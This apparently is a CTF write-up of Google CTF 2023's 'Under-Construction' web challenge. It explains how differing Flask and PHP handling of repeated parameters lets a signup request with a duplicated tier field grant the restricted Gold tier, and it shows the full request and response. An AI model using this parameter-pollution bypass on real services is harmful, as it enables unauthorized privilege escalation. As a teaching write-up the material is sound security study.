### Tiered Trickery

Hello all! This past weekend, I competed in Google's annual CTF event and I wanted to showcase the solution to their web challenge **Under-Construction**. For those who may be unfamiliar, Capture the Flag events are a type of competition in the realm of cybersecurity where participants are presented with a series of puzzles, tasks, and vulnerabilities that they must identify and exploit to find the hidden flag. 

![(https://miro.medium.com/v2/resize:fit:627/1*riUIWHpVkO8MI7FwSJaq9A.png)]

This challenge first provides us with two different web applications, executing on different technology stacks, and the initial information provided  depicts there may be a way to exploit the interaction between these two applications. 

When first navigating to the flask web application, we are greeted with the following message. 

![[Webpage.png]]

Revealing the source code doesn't exhibit any interesting or unusual behavior so I began to continue mapping the application and explored the functionality that handles the signup process. 

The signup form is quite traditional but allows the user to define a Tier Level of their account which I found to be very interesting. Perhaps these tier levels were associated with some level of access control. 

After continuing my testing, it appears that the Blue, Red, and Green tiers are typical low-privileged users with no additional functionality to explore. 


![[signup.png]]

When attempting to select the **Gold** tier in the signup process, the application only allows the CEO to achieve this tier level.![[gold.png]]

Intercepting and manually testing the HTTP POST request to try and bypass any trivial security controls did not highlight anything of interest. I then pivoted my testing to the PHP web application, but the sign up process is protected by a secret key value that gets sent as an HTTP header. 

After a few unsuccessful hours of testing, I stumbled upon a fantastic article by [OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution) which discusses HTTP Parameter Pollution. When a POST request is sent to the registration endpoint of the Flask web application, this is then forwarded by Flash to the PHP web application. The issue arises because these two WebApp frameworks have different interpretations of repeated parameters. 

When a HTTP request is made to a Flask application, Flask receives the request and extracts the parameters from the query string or request body. If a parameter is repeated multiple times in the request, Flask considers the value of the first occurrence as the value of the parameter. While PHP on the other hand, considers the value of the last occurrence as the value of the parameter.

This discrepancy in parameter interpretation is the core of the bypass. Capturing the signup HTTP request in a tool capable of replaying requests, such as Burp suite, modify the message body to include the repeating tier parameter

**HTTP Request**
```
POST /signup HTTP/2
Host: under-construction-web.2023.ctfcompetition.com
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55



username=test_test&password=Test123&tier=blue&tier=gold
```

**HTTP Response**
```
HTTP/2 302 Found
Server: gunicorn
Date: Thu, 29 Jun 2023 03:06:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 201
Location: /signup

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/signup">/signup</a>. If not, click the link.

```

Navigate to the PHP web application and supply the credentials used in the sign up process to receive the flag!

![[flag.png]]


Overall this challenge showcased a clever bypass technique that exploited the divergent interpretations of repeated parameters in the Flask and PHP applications. I had quite the enjoyable time working through some of the challenges this year and look forward to participating in next years competition!
